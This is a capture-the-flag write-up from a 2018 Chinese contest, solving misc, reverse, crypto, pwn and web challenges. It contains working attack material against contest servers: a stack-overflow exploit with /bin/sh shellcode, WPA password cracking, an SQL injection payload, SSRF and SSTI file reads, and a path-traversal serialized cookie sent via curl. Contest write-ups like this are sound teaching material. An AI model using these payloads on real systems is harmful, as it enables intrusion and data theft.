[TOC]

## 湖湘杯复赛题解 by 7HxzZ

### MISC

#### disk

> sorry Linux just use english for type.

find interesting data using this [tool](https://www.cgsecurity.org/wiki/TestDisk_Download)

![123](img/Screenshot%20from%202018-11-18%2010-50-27.png)


extract data from disk
```bash
$ xxd flag0.txt:ads 
00000000: 0110 0110 0110 1100 0110 0001 0110 0111  ................
00000010: 01                                       .

# feilee @ crypto in ~/Videos/HXB_2018/testdisk-7.1-WIP [10:37:10] 
$ xxd flag1.txt:ads
00000000: 1110 1100 1101 0001 0001 0001 0100 1101  ................
00000010: 01                                       .

# feilee @ crypto in ~/Videos/HXB_2018/testdisk-7.1-WIP [10:37:20] 
$ xxd flag2.txt:ads
00000000: 1111 0011 0001 0110 1110 0101 1111 0100  ................
00000010: 01                                       .

# feilee @ crypto in ~/Videos/HXB_2018/testdisk-7.1-WIP [10:37:22] 
$ xxd flag3.txt:ads
00000000: 0000 1100 0101 1100 1101 1010 1101 1111  ................
00000010: 01                                       .
0110 0110 0110 1100 0110 0001 0110 0111 01 1110 1100 1101 0001 0001 0001 0100 110101  1111 0011 0001 0110 1110 0101 1111 010001 0000 1100 0101 1100 1101 1010 1101 1111 01   
```
> get flag:

```python
In [7]: xx  = "0110 0110 0110 1100 0110 0001 0110 0111 01 1110 1100 1101 0001 0001 0001 0100 110101  1111 0011 0001 0110 1110 0101 1111 010001 0000 1100 0101 1100 1101 1010 1101 1111 
   ...: 01".replace(" ","")

In [8]: len(xx)
Out[8]: 136

In [9]: 136/4
Out[9]: 34

In [10]: flag = ""

In [11]: for i in range(0,len(xx),8):
    ...:     flag+=chr(int(xx[i:i+8],2))
    ...:     print flag
    ...:     
f
fl
fla
flag
flag{
flag{4
flag{4D
flag{4DS
flag{4DS_
flag{4DS_1
flag{4DS_1n
flag{4DS_1n_
flag{4DS_1n_D
flag{4DS_1n_D1
flag{4DS_1n_D1s
flag{4DS_1n_D1sk
flag{4DS_1n_D1sk}
```
>  flag:flag{4DS_1n_D1sk}

#### MISC  Flow

pcap and wifi,WEP, so using aircrack-ng to crack the password and ESSID

```bash
# feilee @ crypto in ~/Videos/HXB_2018 [11:50:42] 
$ aircrack-ng ctf.pcap -w ~/ctf/dict/rockyou.txt 
Opening ctf.pcap
Read 13712 packets.

   #  BSSID              ESSID                     Encryption

   1  02:EC:0A:5E:BE:6B  ctf                       WPA (1 handshake)

Choosing first network as target.

Opening ctf.pcap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:00:00] 92/7120714 keys tested (1741.04 k/s) 

      Time left: 1 hour, 8 minutes, 9 seconds                    0.00%

                           KEY FOUND! [ password1 ]


      Master Key     : 7E B8 91 EC 5B 1F 1D C9 32 63 D8 83 79 1D 36 C8 
                       FD 7A CC 88 79 ED AD 09 EE 9F B0 07 1A 23 4D B7 

      Transient Key  : 4E 3F 13 EE 1D D0 FC 1A BB BC 62 11 0B 40 2C 7B 
                       B6 47 40 CF 08 70 87 ED 46 B4 C1 48 6F D9 1A 24 
                       5E 33 ED 34 14 2D B4 90 B3 25 91 79 51 D2 2F 19 
                       9F 36 AF 41 5D C6 E0 3E 74 BB 8D 3C 32 FF 65 44 

      EAPOL HMAC     : 61 96 72 E0 70 20 1B FA 9C 48 DD A1 01 A3 23 83 

# feilee @ crypto in ~/Videos/HXB_2018 [11:51:03] 
$ airdecap-ng -p password1 ctf.pcap -e ctf 
Total number of packets read         13712
Total number of WEP data packets         0
Total number of WPA data packets       581
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       383
```

> EESID is ctf key is : password1, and the decrypted pcap is ctf-dec.pcap

> get flag: flag{H4lf_1s_3n0ugh}

![image](./img/Screenshot%20from%202018-11-18%2011-56-38.png)

#### sign in

> 关注微信号回复hxb2018
>
> flag:hxb2018{W3lc0me_T0_Hxb2o18}

#### Hidden Write

这个图片末尾有串字符,strings 发现有三张图片.用010补全png图片前面八位bite.得到两张以第一张图为图种的图.一共三张图.

![image](./img/Screenshot%20from%202018-11-18%2020-20-12.png)

图片分析:zsteg

![image](./img/Screenshot%20from%202018-11-18%2020-24-26.png)

> 两个相同图片,2.png zsteg存数据,则1.png存在flag的另一半,然后文件末尾也是flag一部分,盲水印隐写
> ```bash
> $ python bwm.py  decode ../longmao.png ../1.png ../5.png
> image<../longmao.png> + image(encoded)<../1.png> -> watermark<../5.png>
> ```
> 得到flag的末尾部分,刚开始测试c4a50}错误,其实是e4a50}

![image](./img/Screenshot%20from%202018-11-18%2020-28-22.png)

>最终flag: 
>hxb2018{b03bca1dbca1662e632ffa5bbefe4a50}

### REVERSE

#### HighwayHash64

> 分析程序，程序对输入长度作hash与0xD31580A28DD8E6C4比较，对输入flag的中间部分做hash和0x1CCB25A666AC646B比较，hash是不可逆的
>
> 很容易可以爆破出输入flag的长度为19，因此扣除flag中固定部分，剩余部分长度为10 。使用unicorn载入爆破，发现非常缓慢，考虑直接用c爆破。
>
> 产生c代码的脚本为：

```python

#!/usr/bin/python3

from keystone import *
from keystone.x86_const import *

ks = Ks(KS_ARCH_X86, KS_MODE_64)
s1 = bytes(ks.asm("mov rcx, rdi\nmov rdx, rsi\n")[0])
with open("./reverse.exe", 'rb') as f:
   cont = f.read()

code = cont[:0xba0-len(s1)] + s1 + cont[0xba0:]

with open("./hash_func", "wb+") as f:
   f.write(code)

c_code = '''
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/mman.h>

typedef long(*Hash)(char *, int);

int main() {
   FILE *fp;
   void *code;
   char buf[0x20];
   fp = fopen("./hash_func", "rb");
   if (NULL == fp) {
       puts("hash_func");
       exit(0);
   }
   Hash hash = (Hash)malloc(0x80000);
   Hash func;
   fread(hash, 0x80000, 1, fp);
   mprotect((void*)((long)hash - ((long)hash & 0xfff)), 0x80000, PROT_WRITE | PROT_READ | PROT_EXEC);
   hash = (char *)hash + ''' + str(0xba0-len(s1)) + \
''';
   for(unsigned long i = 0; i <= 9999999999; i++) {
       func = hash;
       sprintf(buf, "%010lu", i);
       long value = func(buf, 10);
       if (i % 1000000 == 0)
           printf("\\r%lu: %lx", i, value);
       if (value == 0x1CCB25A666AC646B) {
           printf("%lu", i);
           break;
       }
   }
   return 0;
}
'''

with open('./solve.c', "w+") as f:
   f.write(c_code)
```

> 此处的reverse.exe文件patch了一些对security_cookie的检验代码，保证代码能够在linux上正确运行

编译生成的c文件，运行可以在半个小时内得到flag

![image](./img/pasted%20image%200.png)

#### Replace

> 脱掉upx壳后直接分析代码，逻辑很简单，比较输入字符作为数组byte_4021A0
>
> 的下标取值与数组byte_402150的奇偶字节做运算后作为一个字节的高4位和低4位组合后异或0x19的结果是否相等，扒下来数组计算遍历出下标就是flag：

```python
x = "2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6"
table = [0x63,0x7C,0x77,0x7B,0x0F2,0x6B,0x6F,0x0C5,0x30,0x1,0x67,0x2B,0x0FE,0x0D7,0x0AB,0x76,0x0CA,0x82,0x0C9,0x7D,0x0FA,0x59,0x47,0x0F0,0x0AD,0x0D4,0x0A2,0x0AF,0x9C,0x0A4,0x72,0x0C0,0x0B7,0x0FD,0x93,0x26,0x36,0x3F,0x0F7,0x0CC,0x34,0x0A5,0x0E5,0x0F1,0x71,0x0D8,0x31,0x15,0x4,0x0C7,0x23,0x0C3,0x18,0x96,0x5,0x9A,0x7,0x12,0x80,0x0E2,0x0EB,0x27,0x0B2,0x75,0x9,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0x0A0,0x52,0x3B,0x0D6,0x0B3,0x29,0x0E3,0x2F,0x84,0x53,0x0D1,0x0,0x0ED,0x20,0x0FC,0x0B1,0x5B,0x6A,0x0CB,0x0BE,0x39,0x4A,0x4C,0x58,0x0CF,0x0D0,0x0EF,0x0AA,0x0FB,0x43,0x4D,0x33,0x85,0x45,0x0F9,0x2,0x7F,0x50,0x3C,0x9F,0x0A8,0x51,0x0A3,0x40,0x8F,0x92,0x9D,0x38,0x0F5,0x0BC,0x0B6,0x0DA,0x21,0x10,0x0FF,0x0F3,0x0D2,0x0CD,0x0C,0x13,0x0EC,0x5F,0x97,0x44,0x17,0x0C4,0x0A7,0x7E,0x3D,0x64,0x5D,0x19,0x73,0x60,0x81,0x4F,0x0DC,0x22,0x2A,0x90,0x88,0x46,0x0EE,0x0B8,0x14,0x0DE,0x5E,0x0B,0x0DB,0x0E0,0x32,0x3A,0x0A,0x49,0x6,0x24,0x5C,0x0C2,0x0D3,0x0AC,0x62,0x91,0x95,0x0E4,0x79,0x0E7,0x0C8,0x37,0x6D,0x8D,0x0D5,0x4E,0x0A9,0x6C,0x56,0x0F4,0x0EA,0x65,0x7A,0x0AE,0x8,0x0BA,0x78,0x25,0x2E,0x1C,0x0A6,0x0B4,0x0C6,0x0E8,0x0DD,0x74,0x1F,0x4B,0x0BD,0x8B,0x8A,0x70,0x3E,0x0B5,0x66,0x48,0x3,0x0F6,0x0E,0x61,0x35,0x57,0x0B9,0x86,0x0C1,0x1D,0x9E,0x0E1,0x0F8,0x98,0x11,0x69,0x0D9,0x8E,0x94,0x9B,0x1E,0x87,0x0E9,0x0CE,0x55,0x28,0x0DF,0x8C,0x0A1,0x89,0x0D,0x0BF,0x0E6,0x42,0x68,0x41,0x99,0x2D,0x0F,0x0B0,0x54,0x0BB,0x16]
x2 = []

for i in range(0,len(x)/2):
	if ord(x[2*i:2*i+1]) < 0x30 or ord(x[2*i:2*i+1]) > 0x39:
		y = ord(x[2*i:2*i+1]) - 0x57
	else:
		y = ord(x[2*i:2*i+1]) - 0x30

	if ord(x[2*i+1:2*i+2]) < 0x30 or ord(x[2*i+1:2*i+2]) > 0x39:
		z = ord(x[2*i+1:2*i+2]) - 0x57
	else:
		z = ord(x[2*i+1:2*i+2]) - 0x30

	x2.append((y*16+z) ^ 0x19)

for i in x2:
	for j in range(len(table)):
		if table[j] == i:
			print chr(j),
			break
```

![image](./img/pasted%20image%200%20(1).png)

### CRYPTO

#### common crypto

>  根据二进制分析,是aes-ecb加密flag,但是只是加密了前16字节,后16字节没有加密,动态调试得到key即可.`key:\x1b.5FXnr\x86\x9b\xa7\xb5\xc8\xd9\xef\xff\x0c\xc58\xcbs\x9dV\xb9\xf5\x06\xf1\x0c=\xdf\x1e\xf31[:16]`

```python
In [70]: c = "4aee37c73d902a185407ebef96b2798539646536663335323135323035353636"

In [71]: len(c)
Out[71]: 64

In [73]: from Crypto.Cipher import AES

In [80]: aes = AES.new('\x1b.5FXnr\x86\x9b\xa7\xb5\xc8\xd9\xef\xff\x0c\xc58\xcbs\x9dV\xb9\xf5\x06\xf1\x0c=\xdf\x1e\xf31'[:16], AES.MODE_ECB)

In [81]: aes.decrypt("4aee37c73d902a185407ebef96b2798539646536663335323135323035353636".decode("hex"))
Out[81]: 'hxb2018{aa887175;\xe5\xc2\xd1\tZ\x05<\xae\x8d`R\x8fO6<'

In [86]: "4aee37c73d902a185407ebef96b2798539646536663335323135323035353636".decode("hex")
Out[86]: 'J\xee7\xc7=\x90*\x18T\x07\xeb\xef\x96\xb2y\x859de6f35215205566'

In [87]: hxb2018{aa8871759de6f35215205566}
```

`flag: hxb2018{aa8871759de6f35215205566}`

### PWN

#### Regex Format

> 简单的正则匹配：
>
> 正则表达式以冒号开始+自定义字符集+以$结尾，则在正则表达式中的字符集中配置待匹配串中的一个字符，以$+结尾，则匹配多次，最多匹配1000次，以$*结尾，匹配0次或者多次，最多1000次。
>
> 在匹配的过程中，会将待匹配串的中符合正则的字符拷贝到栈上的临时变量上，该变量长100字节，而$+模式可以匹配1000个字符，造成栈溢出，没有开任何保护，直接执行shellcode即可

```python
from pwn import *

#p = process("./pwn1")
p = remote("47.107.172.28",8888)
sc = "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
sc += "\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

p.recvuntil("[*]please input the regex format\n")
p.sendline(":"+sc+"$+" + ":2" + p32(0x0804A260) + "$+")
p.recvuntil("[*]please input the string to match\n")
payload = ""
payload += "Before "
payload += "u"
payload += " it, "
payload += "u"
payload += " it "
payload += "f."
payload +=sc
payload += "2"*(0xd8) + p32(0x0804A260)

p.sendline(payload)
p.sendline("n")
p.interactive()
```

### WEB

#### Code check

> 1. 扫描发现`http://47.107.236.42:49882/news/list.zip`，得到源码
> 2. `http://47.107.236.42:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09`的id存在mysql注入，id经aes加密，密钥、iv、盐都已经给出，写个加密函数，注入即可
> 3. 加密函数如下
> 4. payload：-1 union select 1,title,id,4 from notice2#

```php
 function encode($data){
	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,'');
	mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021');
	$data = $data . 'hxb2018';
	$data = mcrypt_generic($td, $data);
	return base64_encode(base64_encode($data));
}
```



![image](./img/pasted%20image%200%20(2).png)

#### Read Flag

> 1. 存在 SSRF 漏洞
> 2. 手动 fuzz 一下发现可以使用 file 协议读取文件
> 3. 读取 /etc/apache2/sites-enabled/000-default.conf 得到 web 目录为 /var/www/html/ssrf/web.php
> 4. 读取该文件发现，本地请求一下会执行一个叫 readflag 的二进制程序
> 5. 下载该二进制程序发现逻辑仅仅是读取当前文件夹下的 flag 文件
> 6. 通过 ssrf 读取即可

![image](./img/pasted%20image%200%20(3).png)

#### Xmeo

> 1. 注册登录之后创建一个 TODO Item 名称处可以 SSTI
> 2. 然后通过 SSTI 可以执行命令
> 3. 发现执行命令为 root 权限，读取 /home/Xmeo/auto.js 即可获取 flag

```php
page.addCookie({
    'name'     : 'flag',
    'value'    : 'hxb2018{9a6c2dfd3c22c8928f544c0b576e100f}',
    'domain'   : '127.0.0.1',
    'path'     : '/admin/mysecrecy_directory',
    'httponly' : false,
    'secure'   : false,
    'expires'  : (new Date()).getTime() + (1000 * 60 * 60)
  });
```



![image](./img/pasted%20image%200%20(4).png)

#### MyNote

> 1. 访问 Picture 路由发现 Cookie 中有 Picture 字段，为 Base64 编码
> 2. 解码得到反序列化的数据，猜测存在反序列化漏洞，并且序列化的内容中有文件名，该文件会被读取出来编码为 Base64 展示在 HTML 中
> 3. 通过目录扫描得到存在 flag.php
> 4. 通过反序列化进行任意文件读取得到 flag.php 的内容

```bash
curl 'http://39.108.167.229/index.php/picture' -H 'Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=; PHPSESSID=h002spfr0jl8d42a7rep0osmhb;' -vv
<?php $flag = "hxb2018{87f23af96f20d8cb284c578b4c08ad03}"; echo "flag{This_flag_iS_A_F4ke_flag}";
```

![image](./img/pasted%20image%200%20(5).png)

![image](./img/pasted%20image%200%20(6).png)

`flag:flag{This_flag_iS_A_F4ke_flag}`
